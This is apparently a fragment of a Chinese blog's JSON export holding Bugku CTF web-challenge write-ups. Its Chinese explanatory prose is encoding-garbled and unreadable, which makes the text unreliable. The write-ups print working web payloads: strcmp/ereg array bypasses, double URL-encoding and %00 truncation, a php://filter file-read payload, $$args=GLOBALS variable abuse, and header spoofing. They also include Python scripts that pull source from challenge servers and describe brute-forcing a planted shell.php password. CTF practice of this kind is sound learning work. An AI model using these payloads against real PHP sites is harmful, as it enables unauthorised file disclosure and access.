é¢˜ç›®ç»™çš„æ³¨é‡Šå¾ˆæ¸…æ¥šçš„ç»™å‡ºäº†è·å¾—flagçš„æ¡ä»¶ã€‚ã€‚ã€‚ å…ˆäº†è§£ä¸€ä¸‹ strcmp()çš„ä¸¤ä¸ªå‚æ•°éƒ½å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä½†æ˜¯å¦‚æœä¼ é€’ä¸€ä¸ªéå­—ç¬¦ç©¿ç±»å‹çš„å‚æ•°è¿›å»ï¼Œä¾‹å¦‚æ•°ç»„ï¼Œåˆ™å‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå…¶è¿”å›å€¼å°±ä¸º0ã€‚æ»¡è¶³ if (strcmp($_GET[&#39;a&#39;], $flag) == 0) å³å¯è·å¾—flag url:http://123.206.87.240:9009/6.php?a[]= urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡é¢˜ç›®è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼ŒäºŒæ¬¡ç¼–ç ç»•è¿‡ 123456if(eregi(\"hackerDJ\",$_GET[id])) &#123;echo(\"not allowed!\"); PHP å‡½æ•° eregi() è¯­æ³• int eregi(string pattern, string string, [array regs]); å®šä¹‰å’Œç”¨æ³• eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ã€‚Eregi()å¯ä»¥ç‰¹åˆ«æœ‰ç”¨çš„æ£€æŸ¥æœ‰æ•ˆæ€§å­—ç¬¦ä¸²,å¦‚å¯†ç ã€‚ å¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚ è¿”å›å€¼ å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›false è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¼ çš„å€¼ä¸èƒ½ä¸ºhackerDJ 123$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\") //è¦ç¼–ç çš„å­—ç¬¦ä¸²hackerDJ GETä¼šæäº¤æ—¶è¿›è¡Œä¸€æ¬¡urlencode urldecode()äºurlencode()æ˜¯ä¸€å¯¹æƒ³åä½œç”¨çš„å‡½æ•°ï¼Œä¸€ä¸ªè§£ç ä¸€ä¸ªç¼–ç ã€‚ $_GET[id] = urldecode($_GET[id]) urldecodeåçš„$_GET[id] å¤åˆ¶ç»™è‡ªå·±ç­‰äºhackerDJ æ‰€ä»¥å¯¹hackerDJ è¿›è¡Œä¸¤æ¬¡urlencode, ä¸ºäº†ç»•è¿‡è¿‡æ»¤ï¼›è¿›è¡Œä¸€æ¬¡urldecodeåå…¶å€¼å’ŒhackerDJç›¸ç­‰ï¼Œå¾—åˆ°flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()å‡½æ•°ä¹‹å‰å†™è¿‡ æ•°ç»„è¿”å›NULLç»•è¿‡123456789101112&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) //è¿›è¡Œè¿‡æ»¤ï¼Œpasswordå¿…é¡»åŒ…å«å­—æ¯å’Œæ•°å­—echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; æç¤ºæ˜¯æ•°ç»„è¿”å›NULL ç›´æ¥å°è¯•æäº¤?password[]=ï¼Œflagå°±å‡ºæ¥äº† äº†è§£ä¸€ä¸‹åŸç†ï¼Œ ä»£ç ç›¸å…³çŸ¥è¯†ç‚¹é“¾æ¥å¦‚ä¸‹ï¼š issetå‡½æ•°ï¼šhttp://php.net/manual/zh/function.isset.php eregå‡½æ•°ï¼šhttp://www.php.net/manual/zh/function.ereg.php strposå‡½æ•°ï¼šhttp://www.w3school.com.cn/php/func_string_strpos.asp â€œ[A-Za-z0-9]â€æ–¹æ‹¬å·è¡¨ç¤ºå­—ç¬¦é›†ï¼Œ[A-Za-z0-9]åŒ¹é…å¤§å°å†™å­—æ¯å’Œæ•°å­—å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ â€œ^[A-Za-z0-9]$â€^è¡¨ç¤ºå­—ç¬¦ä¸²å¼€å§‹ï¼Œ$è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ ï¼Œè¿™ä¸ªåŒ¹é…åªæœ‰ä¸€ä¸ªå¤§å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸² â€œ^[A-Za-z0-9]+$â€+å·è¡¨ç¤ºé‡å¤1åˆ°å¤šæ¬¡ï¼ŒåŒ¹é…ç”±å¤šä¸ªæ•°å­—å¤§å°å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸² å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°èƒ½å¤„ç†çš„å‚æ•°éƒ½æ˜¯stringç±»å‹ 123eregåªèƒ½å¤„ç†å­—ç¬¦ï¼Œrå¦‚æœæ•°ç»„ï¼Œåˆ™è¿”å›çš„æ˜¯nullï¼Œä¸‰ä¸ªç­‰å·çš„æ—¶å€™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ã€‚æ‰€ä»¥nullä¸ç­‰äºfalseã€‚strposçš„å‚æ•°åŒæ ·ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ä¾æ—§æ˜¯nullï¼Œnullä¸ç­‰äºfalseä¹Ÿæ˜¯æ­£ç¡®ã€‚ æ•…?password[]=å¯ä»¥ç»•è¿‡ã€‚ ä½†æ˜¯è¿˜æœ‰ä¸€ç§ä¸º%00æˆªæ–­ ?password=d%00--","tags":[{"name":"å˜é‡è¦†ç›–","slug":"å˜é‡è¦†ç›–","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"å‡½æ•°æ¼æ´","slug":"å‡½æ•°æ¼æ´","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugkuåˆ·é¢˜è®°å½•2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugkuåˆ·é¢˜è®°å½•2 é€Ÿåº¦è¦å¿«æ‰“å¼€é¡µé¢æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰ æŠ“åŒ…çœ‹äº†çœ‹ï¼ŒæƒŠå–œçš„å‘ç°äº†flagå­—æ®µ ä¸€æ®µbase64 è§£ç åä¸ºNDQyMDIy æäº¤å‘ç°å¹¶ä¸å¯¹ã€‚ã€‚ã€‚çœ‹æ¥å¦æœ‰ç„æœº å¤šgoå‡ æ¬¡åå‘ç°äº†flagå€¼ä¸€ç›´åœ¨å˜ï¼Œå¹¶ä¸”æœ‰ä¸€æ®µæç¤º &lt;!-- OK ,now you have to post the margin what you find --&gt; ç”¨postæ–¹æ³•æäº¤ä½ æ‰€å‘ç°çš„å†…å®¹ï¼Œåªå¥½ä½¿ç”¨è„šæœ¬ï¼ˆä¸ä¼šå†™ï¼‰ 123456789101112import requestsimport base64url=\"http://120.24.86.145:8002/web6/\"r=requests.session()headers=r.get(url).headers#å› ä¸ºflagåœ¨æ¶ˆæ¯å¤´é‡Œ mid=base64.b64decode(headers['flag'])mid=mid.decode()#ä¸ºäº†ä¸‹ä¸€æ­¥ç”¨splitä¸æŠ¥é”™ï¼Œb64decodeåæ“ä½œçš„å¯¹è±¡æ˜¯byteç±»å‹çš„å­—ç¬¦ä¸²ï¼Œè€Œsplitå‡½æ•°è¦ç”¨strç±»å‹çš„ flag = base64.b64decode(mid.split(':')[1])#è·å¾—flag:åçš„å€¼data=&#123;'margin':flag&#125;print (r.post(url,data).text)#postæ–¹æ³•ä¼ ä¸Šå» cookieæ¬ºéª—æ³¨æ„è§‚å¯Ÿurlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= è§£å¯†æ˜¯ä¸ºkey.txt lineæ˜¯è¡Œçš„æ„æ€ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŸ¥çœ‹key.txtçš„ç¬¬lineè¡Œçš„ä»£ç  è¿™é‡Œå¯ä»¥æŸ¥çœ‹index.phpæºç  index.phpçš„base64å€¼ä¸ºaW5kZXgucGhw æ”¹å˜lineçš„å€¼å¯ä»¥ä¸€è¡Œä¸€è¡Œçš„æŸ¥çœ‹æºç ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬ 1234567import requestsurl1 = \"http://123.206.87.240:8002/web11/index.php?line=\"url2 = \"&amp;filename=aW5kZXgucGhw\"mysession = requests.session()for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //çœ‹è¿™é‡Œ$file_list[2]='keys.php';&#125; if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) è¿™é‡Œå¯ä»¥åˆ¤æ–­cookieå¿…é¡»æ»¡è¶³margin=marginæ‰èƒ½è®¿é—®keys.php never give upæŸ¥çœ‹æºç æç¤ºäº† &lt;!--1p.html--&gt; ç›´æ¥è®¿é—®1p.html,å‘ç°ç›´æ¥è·³è½¬åˆ°äº†bugkuçš„ä¸»é¡µï¼Œå…ˆçœ‹æºç ï¼Œå‘ç°ä¸€æ®µç¼–ç åº”è¯¥æ˜¯base64 1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64è§£ç åä¸ºurlç¼–ç  1![never1](E:\\myblog\\szyblog\\source\\_posts\\bugku1\\never1.png)%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E urlè§£ç ä¸ºæºç  12345678910111213141516171819202122232425&lt;?phpf(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\"); //æ³¨æ„è¿™é‡Œï¼Œflagåº”è¯¥è—åœ¨è¿™é‡Œ&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; æœç„¶è—åœ¨f4l2a3g.txt æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ1234567 &lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125; preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); é‡ç‚¹åœ¨è¿™å¥è¯ä¸Šï¼Œè€ƒç‚¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼ å®šç•Œç¬¦ï¼š/å’Œ/ï¼ˆä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªï¼Œå…¶å®é™¤äº†\\å’Œå­—æ¯æ•°å­—å…¶å®ƒçš„åªè¦æ˜¯æˆå¯¹å‡ºç°éƒ½å¯ä»¥çœ‹åšå®šç•Œç¬¦ï¼Œæ¯”å¦‚##ã€ï¼ï¼ä¹‹ç±»çš„ï¼‰ï¼› . ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼šè¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ï¼› * ï¼šå‰é¢çš„å­—ç¬¦é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼› {n,m} ï¼šå‰é¢çš„å­—ç¬¦é‡å¤4~7æ¬¡ï¼› \\ ï¼ˆåæ–œçº¿ï¼‰ï¼šåé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ï¼› [a-z] ï¼šåœ¨aåˆ°zä¸­åŒ¹é… ï¼› [[:punct:]] ï¼šåŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼› /i ï¼šè¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼› å› æ­¤å¯ä»¥å†™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ç©¿ keyakey22222key:/a/aaakeyb! ä½ ä»å“ªé‡Œæ¥é¢˜ç›®æç¤º are you from google? ä½ æ˜¯ä»googleæ¥çš„å— è€ƒå¯Ÿhttpå¤´ä¸­çš„refererå‚æ•° Refererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ª ç½‘é¡µ/URL è·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚ä¾‹å¦‚ï¼šRefererï¼šhttp://www.sina.com/ é‚£ä¹ˆå°±æŠ“åŒ…ä¿®æ”¹refererè¿™ä¸ªå‚æ•° Referer: https://www.google.com/,ç›´æ¥goå³å¯ md5 collisionè¿™é¢˜æ˜¯NCTFçš„ä¸€é“é¢˜ï¼ŒåŸé¢˜æ˜¯ç»™äº†æºç  æœ¬åœ°è®¿é—®è§åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†x-forwarded-forï¼Œæœ¬åœ°åœ°å€å¯ä»¥ä½¿ç”¨IP:127.0.0.1 å¯ä»¥ä½¿ç”¨googleæµè§ˆå™¨çš„æ’ä»¶ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨bpæŠ“åŒ…ä¿®æ”¹x-forwarded-for","tags":[{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugkuåˆ·é¢˜è®°å½•1 web2æŸ¥çœ‹æºç å³å¯ è®¡ç®—å™¨ä¿®æ”¹å‰ç«¯ä»£ç  GETpayload: ?what=flag POST çŸ›ç›¾payload: ?num=1a è€ƒå¯Ÿç‚¹ï¼šå¼±ç±»å‹æ¯”è¾ƒ === åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ == åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ æµ‹è¯•ä»£ç  1234567&lt;?phpvar_dump(\"admin\"==0); //truevar_dump(\"1admin\"==1); //truevar_dump(\"admin1\"==1) //falsevar_dump(\"admin1\"==0) //truevar_dump(\"0e123456\"==\"0e4456789\"); //true?&gt; //ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯• 1231 è§‚å¯Ÿä¸Šè¿°ä»£ç ï¼Œ\"admin\"==0 æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–,ç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–çš„ç»“æœæ˜¯0è‡ªç„¶å’Œ0ç›¸ç­‰2 \"1admin\"==1 æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†1adminè½¬åŒ–æˆæ•°å€¼,ç»“æœä¸º1ï¼Œè€Œâ€œadmin1â€œ==1 å´ç­‰äºé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯\"admin1\"è¢«è½¬åŒ–æˆäº†0,ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ3 \"0e123456\"==\"0e456789\"ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰ web3æŸ¥çœ‹æºç åï¼Œåœ¨æœ€ä¸‹é¢çœ‹åˆ°ä¸€ä¸²ç¼–ç ï¼Œä¸ºunicodeç¼–ç  1&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; ä½¿ç”¨å·¥å…·è½¬æ¢ä¸ºå­—ç¬¦ç©¿ åŸŸåè§£ædnsæœåŠ¡å™¨ç”¨æ¥è§£æåŸŸåä¸ºIPï¼Œå¾ˆå¤šå›½å¤–çš„æœåŠ¡å™¨ä¸èƒ½è®¿é—®ï¼Œä¸»è¦åŸå› å°±æ˜¯DNSæœåŠ¡å™¨ä¸èƒ½è§£æé‚£äº›åŸŸå hostså°±æ˜¯æœ¬åœ°ç”¨æ¥è§£æåŸŸåä¸ºIP å› æ­¤hostsæ–‡ä»¶ä¸­æœ‰çš„åŸŸåè®°å½•ï¼Œåœ¨æœ¬ç”µè„‘æµè§ˆå™¨ä¸­å¯ç›´æ¥ä½¿ç”¨åŸŸåè®¿é—® ï¼ˆhostsæ–‡ä»¶éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¿®æ”¹æ–¹å¼ä¸ºä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œè®°äº‹æœ¬åæ‰“å¼€hostsï¼‰ è·¯å¾„ä¸ºï¼šC:\\Windows\\System32\\drivers\\etc æ–‡ä»¶ä¿å­˜ååœ¨æµè§ˆå™¨ä¸­è®¿é—®è¯¥åŸŸå è·å¾—flag ä½ å¿…é¡»è®©ä»–åœä¸‹æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŠ“åŒ…è¯•è¯• goå®Œä¹Ÿæ²¡ä»€ä¹ˆååº”ï¼Œæœ‰ç‚¹è¿·æƒ‘ ä½†æ˜¯å¤šgoå‡ æ¬¡åï¼Œå‘ç°æœ‰å¼ å›¾ç‰‡åœ¨å˜ å¤šgoå‡ æ¬¡å°±å‡ºæ¥äº†flag,åŸç†è¿˜æœªçŸ¥ å˜é‡1123456789101112 &lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; é¦–å…ˆçœ‹åˆ°è¦ç”¨getæ–¹å¼æäº¤ä¸€ä¸ªargså‚æ•°ï¼Œè€Œåœ¨æœ€åä¸€è¡Œä»£ç é‡Œåˆæœ‰var_dump(&amp;&amp;args)ï¼Œäºæ˜¯ä¼ å…¥argså‚æ•°çš„å€¼ä¸ºGLOBALS,è¿™æ ·æœ€åä¸€è¡Œä»£ç å°±å˜æˆäº†var_dumpï¼ˆ&amp;GLOBALSï¼‰ï¼Œç„¶åvar_dumpå‡½æ•°è¿è¡Œä¼šè¾“å‡ºæ‰€æœ‰å˜é‡ï¼Œå¾—å‡ºflagã€‚ Globalçš„ä½œç”¨æ˜¯å®šä¹‰å…¨å±€å˜é‡,ä½†æ˜¯è¿™ä¸ªå…¨å±€å˜é‡ä¸æ˜¯åº”ç”¨äºæ•´ä¸ªç½‘ç«™,è€Œæ˜¯åº”ç”¨äºå½“å‰é¡µé¢,åŒ…æ‹¬includeæˆ–requireçš„æ‰€æœ‰æ–‡ä»¶ã€‚ GLOBALS:ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ å³å°†includeâ€flag.phpâ€ä½œä¸ºå…¨å±€å˜é‡åœ¨æœ¬é¡µé¢è¾“å‡º ?args=GLOBALS web5æºç ä¸­ä¸€ä¸²ç‰¹åˆ«çš„ä»£ç ç›´æ¥æ”¾åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°ä¸­è¿è¡Œ å¤´ç­‰èˆ±æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ æ‰«æç›®å½•ï¼Œæ‰«å‡ºæ¥ä¸€å¤§å †æ²¡ç”¨çš„ï¼Œç›´æ¥æŠ“åŒ… ã€‚ã€‚ã€‚ã€‚å°±å‡ºæ¥äº† ç½‘ç«™è¢«é»‘åå­—æç¤ºäº†ï¼Œç½‘ç«™è¢«é»‘ã€‚ æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°é¼ æ ‡åŠ¨ä¸äº†ï¼Œå¯èƒ½æ˜¯è¢«é»‘åçš„åé—ç—‡ å…ˆæ‰«æç›®å½•å‘ç°äº†shell.php,è¿™å¯èƒ½æ˜¯ä¸Šæ¬¡é»‘å®¢ç•™ä¸‹çš„å°é©¬æ–‡ä»¶ æ‰“å¼€é¡µé¢ï¼Œéœ€è¦å¯†ç ï¼Œè¿™å°±éœ€è¦çˆ†ç ´äº†(æŸ¥çœ‹äº†wp,çŸ¥é“äº†å¯†ç ä¸ºhack,ä¸çŸ¥é“æ—¶å°±éœ€è¦ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å¯†ç å­—å…¸æ‰èƒ½ç ´è§£) ç¡®å®šè¦çˆ†ç ´çš„å˜é‡ åŠ è½½å¯†ç å­—å…¸ å‡ºç°ç»“æœï¼ˆæ ¹æ®lengthç¡®å®šå¯†ç ï¼‰ å¯†ç ä¸ºhack ç™»å½•å³å¯ ç®¡ç†å‘˜ç³»ç»Ÿéšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å‘ç°æç¤ºIP æƒ³åˆ°äº†X-FORWORADED-FOR:127.0.0.1 æŠ“åŒ…è¯•è¯• åœ¨å“åº”åŒ…ä¸­å‘ç°ä¸€æ®µbase64ç¼–ç dGVzdDEyMw== è§£å¯†åä¸ºtest123ï¼ŒçŒœæµ‹ä¸ºç™»å½•å¯†ç  ç»“æœçœŸå¯¹äº† å½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•åšï¼Œä½†æ˜¯å¯†ç å­—å…¸éœ€è¦åŒ…å«test123 web4æŸ¥çœ‹æºç å‘ç°ä¸€æ®µjsä»£ç  å°†æœ€åçš„evalæ”¹æˆalert(),ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¼¹å‡ºç»“æœ 12345678910function checkSubmit()&#123;var a=document.getElementById(\"password\");if(\"undefined\"!=typeof a)&#123;if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value)return!0;alert(\"Error\");a.focus();return!1&#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) ç›´æ¥è¾“å…¥67d709b2b54aa2aa648cf6e87a7114f1 flagåœ¨indexé‡Œé¢˜ç›®å·²ç»æç¤ºäº†flagçš„ä½ç½®åº”è¯¥åœ¨index.phpä¸­ï¼Œé‚£ä¹ˆè·å–index.phpçš„æºç å°±å¾ˆå…³é”®ï¼Œå¯æ˜¯æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰ æ³¨æ„åˆ°äº†url:http://123.206.87.240:8005/post/index.php?file=show.php å‡ºç°fileè¿™ä¸ªå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´ ç”¨ä¸‹é¢çš„payload,è·å–index.phpï¼Œæºç çš„base64å€¼ ?file=php://filter/read=convert.base64-encode/resource=index.php 1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== è§£ç ä¸º 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; 